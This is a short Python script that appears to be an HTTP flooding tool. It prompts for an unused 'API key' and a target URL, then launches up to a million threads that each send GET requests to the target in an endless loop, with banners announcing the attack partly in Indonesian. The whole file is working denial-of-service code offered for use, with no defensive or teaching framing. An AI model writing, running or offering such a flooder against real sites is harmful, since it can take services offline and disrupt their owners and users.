import threading
import requests
from rich.console import Console
from rich.panel import Panel

console = Console()

def attack_with_apikey(api_key, target_url):
    console.print(Panel(f"[bold cyan]ATTACK {target_url} ", expand=True))

    thread_count = 1000000

    def send_request():
        while True:
            try:
                requests.get(target_url)
            except requests.exceptions.RequestException:
                pass

    console.print(f"[bold yellow]START {thread_count} THREAD [/bold yellow]")

    for _ in range(thread_count):
        threading.Thread(target=send_request).start()

    console.print(Panel("[bold green]MEMULAI MENYERANG[/bold green]", style="bold red", expand=True))

if __name__ == "__main__":
    api_key = console.input("[bold yellow]>> API KEY >> : [/bold yellow]")
    target_url = console.input("[bold yellow]>> URL TARGET >> : [/bold yellow]")
    attack_with_apikey(api_key, target_url)
